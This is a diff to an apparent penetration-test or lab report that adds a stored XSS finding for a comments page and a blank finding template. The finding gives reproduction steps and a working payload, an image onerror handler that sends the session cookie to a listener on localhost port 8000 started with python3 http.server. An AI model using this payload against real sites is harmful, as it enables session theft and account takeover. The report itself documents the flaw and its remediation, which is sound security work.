@@ -118,6 +118,110 @@ Like this:
 - CWE: https://cwe.mitre.org/data/definitions/89.html
 
 ---
+### [F-02] Stored XSS
+
+| Field          | Details                             |
+| -------------- | ----------------------------------- |
+| **Severity**   | High                                |
+| **CVSS Score** | 8.1                                 |
+| **Category**   | OWASP A05: Injection (XSS) · CWE-79 |
+| **Status**     | Open                                |
+
+### 🎯 Location
+- **Affected endpoint:** `GET /api/comments/` 
+- **Vulnerable parameter:** `search` location: header
+
+### 📝 Description
+Stored XSS in the comments feature. A comment's `body` is persisted in the database and rendered on the `/comments` page via React's `dangerouslySetInnerHTML` without sanitization, which bypasses React's default escaping and treats stored user input as trusted HTML. As a result, an attacker can store active markup that executes in the browser of every user who loads the page (Stored XSS — no interaction required). Because the `session` cookie is not marked `HttpOnly`, the injected script can read it via `document.cookie` and exfiltrate it, enabling session hijacking and potential account takeover of any viewer.
+
+### 🔑 Preconditions
+None — accessible to any user
+
+### 🔁 Steps to Reproduce
+1. Go to `/comments`. In the `name` field enter `attacker`, and in the comment field enter `<script>alert(1);</script>`. Submit.
+2. Observe that no alert fires. In DevTools → Elements, confirm the `<script>` tag is present in the DOM but was not executed (scripts inserted via innerHTML are inert).
+3. On Kali (WSL), start a listener to receive the stolen cookie: `python3 -m http.server 8000`.
+4. In DevTools → Network, inspect the `session` cookie and confirm the `HttpOnly` flag is NOT set (so `document.cookie` can read it).
+5. Return to `/comments`. In `name` enter `attacker`, and in the comment field inject the payload below. Submit.
+6. Load the comments page as a victim (any user viewing the stored comment).
+
+### 💉 Payload
+```html
+<img src=x onerror="new Image().src='http://127.0.0.1:8000/?c='+encodeURIComponent(document.cookie)">
+```
+
+### 👁️ Observed Result
+- The `<script>` payload appeared in the DOM (Elements tab) but did not execute.
+- The `<img src=x onerror=...>` payload executed when the page loaded.
+- The `python3 -m http.server` listener received a request of the form `GET /?c=<url-encoded cookie>` — i.e. the victim's `document.cookie` was successfully exfiltrated to the attacker's server. This confirms the stored comment runs arbitrary JavaScript in every viewer's browser, and the session cookie is readable because `HttpOnly` is absent.
+
+### 📸 Evidence
+- `the-cookie-get.png` — The HTTP Request to the localhost with the cookie
+- `localhost-eyes.png` - The GET Request from the Console in HTTP Server.
+
+### 💥 Impact (CIA)
+- Confidentiality: the `session` cookie of every user who views the comment is stolen (demonstrated).
+- Integrity / Account takeover (potential): with a stolen session cookie, an attacker could impersonate the victim and act on their behalf. (Cookie theft demonstrated; takeover not yet demonstrated.)
+- Stored XSS means the payload auto-executes for every viewer with no interaction, maximizing reach.
+
+### 🔧 Remediation
+- **Primary fix:** Do not use `dangerouslySetInnerHTML`; simply copy the text into place without it. React will automatically handle the escaping.
+- **Defense in Depth:** HttpOnly
+
+### 🔗 References
+- OWASP: https://top10.owasp.org/2025/A05_2025-Injection/
+- CWE: https://cwe.mitre.org/data/definitions/79.html
+
+---
+### [F-XX] Short, clear finding title
+
+| Field          | Details                                    |
+| -------------- | ------------------------------------------ |
+| **Severity**   | Critical                                   |
+| **CVSS Score** | 9.1 — optional                             |
+| **Category**   | OWASP A01: Broken Access Control · CWE-639 |
+| **Status**     | Fixed                                      |
+
+### 🎯 Location
+- **Affected endpoint:**  `GET /api/users/:id`
+- **Vulnerable parameter:** `<param>` _(location: query / body / header / cookie / path)_
+
+### 📝 Description
+_(In your own words: what the vulnerability is and why it exists. Name the misplaced trust — what the server/code assumes, and what the attacker can do instead.)_
+
+### 🔑 Preconditions
+_(Authentication required? Special privileges? If none — "None — accessible to any user".)_
+
+### 🔁 Steps to Reproduce
+1. _(...)_
+2. _(...)_
+3. _(...)_
+
+### 💉 Payload
+```
+<the-exact-payload-here>
+```
+
+### 👁️ Observed Result
+_(What actually happened, including the observable signal. E.g. "Received another user's private_note", or "Correct guess → 200, incorrect → 401".)_
+
+### 📸 Evidence
+- `screenshot-01.png` — _(description: request and response)_
+- `screenshot-02.png` — _(description: two-state comparison / before-after)_
+
+### 💥 Impact (CIA)
+- **Confidentiality:** _(Is data leaked? Which?)_
+- **Integrity:** _(Can data be modified/deleted?)_
+- **Availability:** _(Can the service be disrupted/taken down?)_
+
+### 🔧 Remediation
+- **Primary fix:** _(the main fix — in your own words.)_
+- **Defense in Depth:** _(extra layers: least privilege, server-side validation, etc.)_
+
+### 🔗 References
+- OWASP: _(link)_
+- CWE: _(link)_
+
 ---
 
 ## 📎 Appendix — Severity Quick Guide
